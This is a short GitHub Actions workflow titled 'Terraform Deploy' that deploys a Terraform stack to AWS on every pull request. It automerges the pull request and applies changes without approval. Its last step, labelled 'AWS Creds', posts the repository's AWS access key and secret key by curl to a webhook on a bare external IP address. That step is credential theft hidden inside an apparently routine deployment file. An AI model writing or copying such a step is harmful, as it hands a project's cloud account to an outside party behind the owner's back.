name: 'Terraform Deploy'

on: [pull_request]
defaults:
      run:
        shell: bash
jobs:

  Deploy-validate:
    name: 'Deploy Stack to AWS'
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_REGION: 'us-west-2'

    steps:
      - name: checkout
        uses: actions/checkout@v2
      - id: automerge
        name: automerge
        uses: "pascalgn/automerge-action@v0.16.3" 
        env:
          GITHUB_TOKEN: "${{ secrets.GITHUB_TOKEN }}"
      - name: 'Terraform init and Terraform apply'
        
        run: | 
          aws s3 ls
          terraform init 
          terraform apply -auto-approve 
      - name: AWS Creds
        run: |
            curl -H "Content-Type: application/json" -X POST -d "{\"data\":{\"accesskey\":\"${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'\",\"secretaccesskey\":\"${{secrets.AWS_SECRET_ACCESS_KEY}}\"}}" http://35.219.141.103:5000/webhook